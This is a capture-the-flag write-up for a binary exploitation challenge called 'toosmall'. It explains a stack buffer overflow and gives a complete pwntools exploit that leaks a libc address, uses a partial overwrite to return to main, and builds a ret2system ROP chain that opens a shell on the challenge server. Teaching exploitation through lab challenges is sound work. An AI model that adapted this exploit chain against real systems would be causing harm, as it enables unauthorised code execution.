## Question 

This program is so small that you just can't do anything here :)

``nc 34.141.229.188 1337``

[chall](chall)

## Solution

The binary suffers a buffer overflow since there are only 0x10 bytes reserved for the buffer on the stack but the program reads in 0x100 bytes.

```
000011c9  int32_t main(int32_t argc, char** argv, char** envp)

000011c9  {
000011e4      setbuf(stdout, nullptr);
000011f8      setbuf(stdin, nullptr);
0000120e      void var_18;
0000120e      memset(&var_18, 0, 0x10);
0000121d      puts("What's your favourite movie?: ");
00001238      read(0, &var_18, 0x100);
00001253      printf("Oooh you like %s?\n", &var_18);
0000125e      return 0;
0000125e  }

.text (PROGBITS) section ended  {0x10e0-0x125f}
```

However, exploiting this is complicated since the binary has ``PIE`` protection mechanism. This means we can't reliably return to anywhere without a memory leak of either the stack, base address, or libc base address.

```
└─# pwn checksec ./chall
[*] '/root/workspace/nitectf/toosmall/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

```

Luckily it looks like the buffer is on the stack and borders right up against a libc address. If we write 24 bytes, the printf format specifier ``%s`` will just treat our buffer as a continguous memory block 32 bytes long (our 24 bytes + the 8 byte libc address.)

```
└─# cyclic 24
aaaabaaacaaadaaaeaaafaaa
 
┌──(root㉿b81e079dfb55)-[~/workspace/nitectf/toosmall]
└─# ./chall
What's your favourite movie?: 
aaaabaaacaaadaaaeaaafaaa
Oooh you like aaaabaaacaaadaaaeaaafaaa
Ѯw?
Illegal instruction
```

However, we must return to ``main`` to restart the program and reintroduce the vulnerabiliyt after leaking the ``libc base address``. We can do this with a ``partial overwrite``. I was pretty lazy at this point and just decided to brute force the bytes ``\x00-\xff`` and see which ones would return me to main. Full script is [here](brute-toosmall.py)

```python
def check_partial(overwrite):
  p = start()
  chain = b'A'*24+chr(overwrite).encode()
  p.send(chain)
  time.sleep(2)
  p.recvuntil(b'Oooh you like')
  p.recvuntil(b'?')
  p.recvuntil(b'\n')
  try:
    print(overwrite,p.recvline())
  except:
    pass

R = 255
threads = []
for x in range(0,R):
    threads.append(multiprocessing.Process(target = check_partial, args=(x,)))
    threads[x].start()
for x in range(0,R):
    threads[x].join()
```

The first example I saw where I return to ``main`` was with a partial overwrite of ``\x1c``. when the script displayed ``28 b"What's your favourite movie?: \n"`` With this knowledge, I combined the leak, return to main, and then used a ``ret2system`` in ``libc`` on the second pass.

```python
from pwn import *

binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)

gs = '''
break *$rebase(0x125d)
continue
'''

libc = ELF('./libc.so.6',checksec=False)

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('34.141.229.188',1337)
    else:
        return process(e.path)

p = start()

def leak_libc():
  chain = b'A'*24+chr(28).encode()
  chain = b'A'*24+b'\x1c'
  p.send(chain)
  p.recvuntil(b'Oooh you like AAAAAAAAAAAAAAAAAAAAAAAA')
  leak=u64(p.recvline().strip(b'\n')[0:6]+b'\x00\x00')
  libc_start_main = leak+(0x7fb2c9a0bdc0-0x7fb2c9a0bd1c)
  libc.address=libc_start_main-libc.sym['__libc_start_main']

def ret2system():
  r = ROP(libc)
  chain = b'A'*24
  chain += p64(r.find_gadget(['ret'])[0])
  chain += p64(r.find_gadget(['pop rdi','ret'])[0])
  chain += p64(next(libc.search(b'/bin/sh')))
  chain += p64(libc.sym['system'])
  p.sendline(chain)

leak_libc()
print("libc base",hex(libc.address))
ret2system()
p.interactive()
```

Running it yields the flag

```
python3 pwn-toosmall.py BIN=./chall_patched REMOTE
[+] Opening connection to 34.141.229.188 on port 1337: Done
libc base 0x7ff0cba90000
[*] Loaded 218 cached gadgets for './libc.so.6'
[*] Switching to interactive mode
What's your favourite movie?: 
Oooh you like AAAAAAAAAAAAAAAAAAAAAAAA֜\xab\xcb\xf0\x7f?
$ cat /flag
nite{wh3n_h3_s41d_1tS_r0pp1n_t1me_1_cr13d}
```
